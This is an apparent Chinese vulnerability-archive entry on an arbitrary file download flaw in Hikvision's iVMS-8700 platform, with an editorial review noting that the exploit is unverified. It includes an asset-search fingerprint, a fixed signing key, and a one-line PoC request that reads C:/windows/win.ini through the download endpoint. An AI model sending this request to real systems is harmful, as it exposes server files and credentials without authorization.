---
source: "wy876 漏洞文库"
id: "vw-8d8e392e432db4e63603d64b"
entity_id: "ve-8d8e392e432db4e63603d64b"
schema_version: "1"
fofa_unverified: "app.name=="
title: "海康威视 iVMS-8700综合安防管理平台 download 任意文件下载"
product: "Hikvision iVMS-8700 EPS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "需MD5大写token，url+固定key；Windows样例，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/okdesxq0iuq0sfkb"
source_status: "recorded"
---

# 海康威视 iVMS-8700综合安防管理平台 download 任意文件下载

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iVMS-8700 EPS
- 本文讨论：api/triggerSnapshot/download fileUrl读取及固定密钥签名
- 版本、权限与配置前提：需MD5大写token，url+固定key；Windows样例，版本未知
- 资料类型：令牌接口文件读取线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- url含义是完整目标/接口路径/参数未明确，token生成不可复现；MD5称加密不准确
- 只有xxx占位token无响应/源码，不能宣称普遍免认证
- 与876无api .action路由不同，关联组件族保留权限差异
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- token计算、密钥适用构建与认证待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息

# 二、影响版本
+ HIKVISION iVMS-8700综合安防管理平台

# 三、资产测绘
+ hunter：`app.name=="Hikvision 海康威视 iVMS"`


+ 登录页面


# 四、漏洞复现
poc，token为`url+secretKeyIbuilding`进行MD5加密（**32位大写**）

```plain
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/okdesxq0iuq0sfkb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
